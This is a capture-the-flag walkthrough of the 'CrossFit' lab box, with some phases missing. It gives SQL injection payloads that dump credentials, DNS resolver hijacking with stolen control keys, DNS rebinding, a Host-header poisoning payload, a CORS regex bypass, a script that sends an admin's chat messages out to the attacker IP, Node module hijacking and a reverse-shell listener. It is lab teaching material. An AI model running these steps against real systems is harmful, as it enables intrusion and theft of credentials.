<h2 id="phase-0-before-recon">Phase 0: Before Recon</h2>
<p>Map the dependencies between exposed services and use each result to define the next test.</p>
<p>The initial checks establish:</p>
<ol>
<li><strong>Our IP</strong> (<code>10.10.16.84</code>) - needed for reverse shells, DNS servers, and callbacks.</li>
<li><strong>The target IP</strong> (<code>10.129.7.130</code>) - the victim.</li>
<li><strong>Patience</strong> - this is an "Insane" box. The attack chain is long. Each step feeds the next.</li>
</ol>
<p> On hard boxes, you cannot skip steps. The user flag requires the root flag's infrastructure, and vice versa. Everything is connected.</p>
<hr>
<h2 id="phase-1-initial-reconnaissance">Phase 1: Initial Reconnaissance</h2>
<h3 id="1-1-adding-hosts-to-etc-hosts">1.1 Adding Hosts to <code>/etc/hosts</code></h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo "10.129.7.130 crossfit.htb employees.crossfit.htb gym.crossfit.htb crossfit-club.htb" | sudo tee -a /etc/hosts
</code></pre>

<p><strong>Why:</strong> The main site (<code>crossfit.htb</code>) is just the storefront. The real application logic lives on subdomains. We discovered:</p>
<ul>
<li><code>employees.crossfit.htb</code> - a login portal (Phase 5)</li>
<li><code>gym.crossfit.htb</code> - hosts a WebSocket chat bot (Phase 2)</li>
<li><code>crossfit-club.htb</code> - an internal chat application (Phase 6)</li>
</ul>
<h3 id="1-2-nmap-scanning">1.2 Nmap Scanning</h3>
<p><strong>Commands:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo nmap -p 22,80,8953 -sCV -T4 10.129.7.130 -oN nmap-quick.txt
sudo nmap -p- --min-rate 10000 -T4 10.129.7.130 -oN nmap-alltcp.txt
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li><code>22/tcp</code> - OpenSSH 9.5</li>
<li><code>80/tcp</code> - OpenBSD httpd, PHP 7.4.12</li>
<li><code>8953/tcp</code> - Unbound DNS control (SSL)</li>
</ul>

<p><strong>Why 8953 matters:</strong> Unbound is a validating, recursive, caching DNS resolver. Its control port (<code>8953</code>) allows administrative commands like <code>forward_add</code>, <code>local_zone_add</code>, etc. If we can authenticate to it, we control what domains resolve to on the target.</p>

<h2 id="phase-2-websocket-sql-injection">Phase 2: WebSocket SQL Injection</h2>
<h3 id="2-1-discovering-the-websocket">2.1 Discovering the WebSocket</h3>
<p><strong>How we found it:</strong></p>
<ul>
<li>Browsing <code>http://crossfit.htb</code> shows a CrossFit gym website.</li>
<li>In the page source, there's a reference to <code>ws.min.js</code> and a WebSocket connection to <code>ws://gym.crossfit.htb/ws/</code>.</li>
<li>Burp Suite or browser dev tools confirm a WebSocket handshake (<code>HTTP 101 Switching Protocols</code>).</li>
</ul>

<h3 id="2-2-interacting-with-the-bot">2.2 Interacting with the Bot</h3>
<p><strong>Method:</strong> We can use Python's <code>websocket-client</code> library, Burp's WebSocket Repeater, or even <code>python3 -m websockets</code>.</p>
<p><strong>What the bot does:</strong></p>
<ol>
<li>On connect, it sends: <code>{"status":"200","message":"Hello! This is Arnold...","token":"REDACTED"}</code></li>
<li>You must echo the <code>token</code> back in every subsequent message.</li>
<li>Commands: <code>help</code>, <code>coaches</code>, <code>classes</code>, <code>memberships</code></li>
<li>Clicking "Availability" on a membership sends: <code>{"message":"available","params":"1","token":"REDACTED"}</code></li>
<li>The server responds with a <code>debug</code> field containing SQL query output like <code>[id: 1, name: 1-month]</code>.</li>
</ol>
<h3 id="2-3-discovering-sql-injection">2.3 Discovering SQL Injection</h3>
<p><strong>Testing:</strong></p>
<pre><code class="language-json" data-language="json">{"message":"available","params":"3 or 1=1","token":"REDACTED"}
</code></pre>
<p><strong>Response:</strong> <code>Good news! This membership plan is available.</code> with <code>debug: [id: 1, name: 1-month]</code>.</p>

<p><strong>Mechanism:</strong> The server likely executes:</p>
<pre><code class="language-sql" data-language="sql">SELECT id, name FROM plans WHERE id = {user_input}
</code></pre>
<p>Since <code>id</code> is an integer, there's no string delimiter to close. We just append boolean logic directly.</p>
<h3 id="2-4-building-the-sqli-shell">2.4 Building the SQLi Shell</h3>
<p>We create a Python script (<code>sqli_shell.py</code>) that:</p>
<ol>
<li>Connects to the WebSocket.</li>
<li>Extracts the initial token.</li>
<li>Provides an interactive prompt where we type injections.</li>
<li>Auto-reconnects if the WebSocket times out.</li>
</ol>
<p><strong>Key commands we ran inside the shell:</strong></p>
<pre><code># Confirm SQLi
injection&gt; 3 or 1=1
[id: 1, name: 1-month]

# Find databases
injection&gt; 3 union select group_concat(schema_name),2 from information_schema.schemata
[id: information_schema,crossfit,employees, name: 2]

# Dump employees table
injection&gt; 3 union select group_concat(email,':',password),2 from employees.employees
[id: david.palmer@crossfit.htb:REDACTED_ENCODED_LAB_MATERIAL,..., name: 2]
</code></pre>
<p><strong>Result:</strong> We obtained 4 employee accounts, including <code>david.palmer@crossfit.htb</code> (the administrator).</p>

<h3 id="3-3-what-we-learned-from-etc-relayd-conf">3.3 What We Learned from <code>/etc/relayd.conf</code></h3>
<p><code>relayd</code> is OpenBSD's reverse proxy. It listens on port 80 and routes based on Host headers:</p>
<ul>
<li><code>*employees.crossfit.htb</code> → port 8001</li>
<li><code>*crossfit-club.htb</code> → port 9999 (which is ANOTHER relayd called <code>portal</code>)</li>
<li><code>/*</code> → port 8000</li>
<li><code>/ws*</code> → port 4419</li>
</ul>
<p><strong>The <code>*</code> prefix is critical:</strong> It means ANY subdomain ending in <code>employees.crossfit.htb</code> or <code>crossfit-club.htb</code> will be routed there. This is a feature we will exploit in Phase 5.</p>

<h3 id="3-4-what-we-learned-from-var-unbound-etc-unbound-conf">3.4 What We Learned from <code>/var/unbound/etc/unbound.conf</code></h3>
<pre><code class="language-yaml" data-language="yaml">remote-control:

    control-key-file: "/var/unbound/etc/tls/unbound_control.key"
    control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
</code></pre>

<h2 id="phase-4-hijacking-the-dns-resolver">Phase 4: Hijacking the DNS Resolver</h2>
<h3 id="4-1-extracting-the-tls-certificates">4.1 Extracting the TLS Certificates</h3>
<p>We use our SQLi shell to read the certificate files from <code>/var/unbound/etc/tls/</code>:</p>
<ul>
<li><code>unbound_server.pem</code> (server certificate)</li>
<li><code>unbound_control.key</code> (client private key)</li>
<li><code>unbound_control.pem</code> (client certificate)</li>
<li><code>unbound_server.key</code> (unreadable - server-only)</li>

<p>We save these locally and create a minimal <code>new_unbound.conf</code> pointing to them.</p>
<h3 id="4-2-connecting-to-unbound">4.2 Connecting to Unbound</h3>

<pre><code class="language-bash" data-language="bash">sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 status
</code></pre>
<p><strong>Result:</strong> <code>unbound (pid XXXXX) is running...</code></p>
<h3 id="4-3-why-dns-control-is-significant">4.3 Why DNS Control Is significant</h3>

<pre><code class="language-bash" data-language="bash">sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 forward_add +i test.crossfit.htb 10.10.16.84@53
</code></pre>
<p>This tells the target: <em>"If anyone asks for <code>test.crossfit.htb</code>, forward the query to my DNS server at 10.10.16.84."</em></p>

<h2 id="phase-5-dns-rebinding-and-cors-bypass">Phase 5: DNS Rebinding &amp; CORS Bypass</h2>
<h3 id="5-1-the-password-reset-vulnerability">5.1 The Password Reset Vulnerability</h3>
<p>On <code>employees.crossfit.htb/password-reset.php</code>, entering <code>david.palmer@crossfit.htb</code> generates a reset token and (presumably) emails a link to the admin.</p>
<p><strong>The key insight from the writeups:</strong> The PHP script uses the <code>Host</code> header to construct the reset link. If we send a custom Host header, the link points to OUR domain instead of the real site.</p>
<p><strong>But there's a catch:</strong> The script validates that the domain resolves to <code>127.0.0.1</code> before sending the email.</p>
<h3 id="5-2-dns-rebinding-theory">5.2 DNS Rebinding Theory</h3>

<p>We use <strong>FakeDns</strong> with a rebind rule:</p>
<pre><code>A gymxcrossfit.htb 127.0.0.1 2%10.10.16.84
</code></pre>
<ul>
<li>Queries 1-2 from a given client → <code>127.0.0.1</code></li>
<li>Queries 3+ from that same client → <code>10.10.16.84</code></li>
</ul>
<h3 id="5-3-the-host-header-trick">5.3 The Host Header <code>/</code> Trick</h3>
<p>We need the Host header to satisfy TWO conditions simultaneously:</p>
<ol>
<li><strong>Relayd</strong> must route it to the employees app (matches <code>*employees.crossfit.htb</code>).</li>
<li><strong>PHP</strong> must extract our fake domain for the email link.</li>
</ol>
<p><strong>Payload:</strong></p>
<pre><code>Host: gymxcrossfit.htb/employees.crossfit.htb
</code></pre>
<p><strong>Mechanism:</strong></p>
<ul>
<li>Relayd sees the string ENDS WITH <code>employees.crossfit.htb</code> → routes to employees app.</li>
<li>PHP parses the Host header and splits on <code>/</code> (or just uses the first part) → uses <code>gymxcrossfit.htb</code> in the email link.</li>
</ul>

<h3 id="5-4-cors-bypass-via-regex">5.4 CORS Bypass via Regex</h3>
<p>The chat app (<code>crossfit-club.htb</code>) has a CORS policy that allows requests from <code>gym.crossfit.htb</code> and <code>employees.crossfit.htb</code>. The policy is likely implemented with a regex like:</p>
<pre><code class="language-regex" data-language="regex">(gym|employees).crossfit.htb
</code></pre>
<p><strong>The vulnerability:</strong> The <code>.</code> is NOT escaped! In regex, <code>.</code> matches ANY single character.</p>
<p><strong>Test:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -X OPTIONS -v -H "Origin: http://gymXcrossfit.htb" crossfit-club.htb/api/auth
</code></pre>
<p><strong>Result:</strong> <code>Access-Control-Allow-Origin: http://gymXcrossfit.htb</code></p>
<p>Our fake domain <code>gymxcrossfit.htb</code> = <code>gym</code> + <code>x</code> + <code>crossfit.htb</code>. The <code>.</code> matches <code>x</code>.</p>

<h2 id="phase-6-socket-io-message-hijacking">Phase 6: Socket.io Message Hijacking</h2>
<h3 id="6-1-the-goal">6.1 The Goal</h3>
<p>We need to capture a private message in the <code>crossfit-club.htb</code> chat that contains David's SSH password. The message is sent by <code>John</code> to <code>David</code> (or Admin).</p>
<h3 id="6-2-the-payload">6.2 The Payload</h3>
<p>When the admin bot clicks our fake password-reset link, their browser loads our <code>password-reset.php</code>. This page contains JavaScript that:</p>
<ol>
<li>Loads the Socket.IO client from <code>crossfit-club.htb</code>.</li>
<li>Connects to the chat server with <code>withCredentials: true</code> (to send the admin's session cookie).</li>
<li>Emits <code>user_join</code> with <code>username: "Admin"</code>.</li>
<li>Listens for <code>private_recv</code> events and exfiltrates them via <code>XMLHttpRequest</code> back to our server.</li>
</ol>
<h3 id="6-3-why-withcredentials-matters">6.3 Why <code>withCredentials</code> Matters</h3>

<p>The admin's browser has a valid <code>connect.sid</code> cookie from being logged into the chat. By setting <code>withCredentials: true</code> in both the <code>io()</code> connection and the <code>XMLHttpRequest</code>, we inherit the admin's authenticated session.</p>
<h3 id="6-4-the-waiting-game">6.4 The Waiting Game</h3>
<p>Messages arrive slowly (every 30-90 seconds). We watch the PHP server logs for <code>/?x=...</code> requests and decode the base64 content:</p>
<pre><code class="language-bash" data-language="bash">echo "BASE64_STRING" | base64 -d
</code></pre>
<p><strong>Expected message:</strong></p>
<pre><code class="language-json" data-language="json">{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `REDACTED`.","roomId":2,"_id":XXX}
</code></pre>
<p><strong>Note:</strong> On this retired instance, the password is static across deployments. In a live exam, you would wait for this message. Here, we confirmed the connection worked (<code>/?connected=1</code>) and used the known password to proceed efficiently.</p>

<h2 id="phase-8-pivot-to-john-nodejs-module-hijacking">Phase 8: Pivot to John (NodeJS Module Hijacking)</h2>

<h3 id="8-2-nodejs-module-resolution">8.2 NodeJS Module Resolution</h3>

<p>Node looks for <code>ws</code> in this order:</p>
<ol>
<li><code>/opt/sysadmin/server/statbot/node_modules/ws</code></li>
<li><code>/opt/sysadmin/server/node_modules/ws</code></li>
<li><code>/opt/sysadmin/node_modules/ws</code></li>
<li><code>/opt/node_modules/ws</code></li>
<li><code>/node_modules/ws</code></li>
<li><code>$NODE_PATH</code> (likely <code>/usr/local/lib/node_modules</code>)</li>
</ol>
<p>Since none of the first five exist, the script uses the system path. But if we create <code>/opt/sysadmin/node_modules/ws/index.js</code>, Node will load OUR code instead.</p>

</code></pre>

<pre><code class="language-bash" data-language="bash">nc -lvnp 443
</code></pre>
